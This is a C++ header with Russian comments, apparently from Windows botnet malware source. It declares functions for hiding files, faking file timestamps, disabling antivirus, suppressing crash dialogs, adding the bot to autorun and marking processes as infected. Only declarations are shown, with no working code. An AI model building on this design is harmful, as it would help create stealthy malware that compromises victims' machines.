//-----------------------------------------------------------------------------
//  Модуль системных утилит бота
//-----------------------------------------------------------------------------
#ifndef BotUtilsH
#define BotUtilsH
//-----------------------------------------------------------------------------


#include <windows.h>
#include "Strings.h"

DWORD SignalFirstRun( DWORD dwParam );


WCHAR *GetStopAVPath();
WCHAR *GetMiniAVPath();

WCHAR *GetTempName();


WCHAR *GetShellFoldersKey( DWORD dwParam );

void CopyFileToTemp( WCHAR *Path, WCHAR *Temp );

void SetFakeFileDateTime(PCHAR Path);
void SetFakeFileDateTimeW(PWCHAR Path);


//----------------------------------------------------------------------------
//  IsHideFile - Функция возвращает истину, если необходимо спрятать
//               указанный файл
//----------------------------------------------------------------------------
BOOL IsHide( DWORD dwFileHash );
BOOL IsHideFile(PWCHAR FileName, ULONG FileNameLen, int ControlPoint);

//----------------------------------------------------------------------------
// DisableShowFatalErrorDialog - функция устанавливает режим отображения
//         ошибок при котором система не будет отображать сообщение о крахе
//         процесса. Тем самым мы скроем крах запущенных ботом процессов
//----------------------------------------------------------------------------
void DisableShowFatalErrorDialog();

void AddToAutoRun(void *body, DWORD size);
void AddToAutoRun(WCHAR *ModulePath);



namespace BOT
{
	//----------------------------------------------
	//  MakeBotPath - Функция возвращает путь к
	//  системной папке, где бот будет хранить свои
	//  данные
	//----------------------------------------------
	string MakeBotPath();

	//----------------------------------------------
	//  MakeWorkPath Функция создаёт рабочую папку
	//               бота и возвращает путь к ней
	//  Адрес будет поддиректорией папку адрес
	//  которой вернёт функция MakeBotPath()
	//----------------------------------------------
	string MakeWorkPath();

	//----------------------------------------------
	//  MakeWorkFolder - Функция генерирует имя
	//                   рабочего каталога бота
	//----------------------------------------------
	PCHAR  MakeWorkFolder();


	//----------------------------------------------
	// MarkAsInfcted
	//
	// Функция омечает текущий поцесс как
	// инфицированный
    //----------------------------------------------
	void MarkAsInfcted();

	//----------------------------------------------
	//  ProcessInfected
	//
	//  Функция возвращает истину если процесс с
	//  указанными пидом инфицирован
	//----------------------------------------------
	bool ProcessInfected(DWORD PID);

}



//-----------------------------------------------------------------------------
#endif
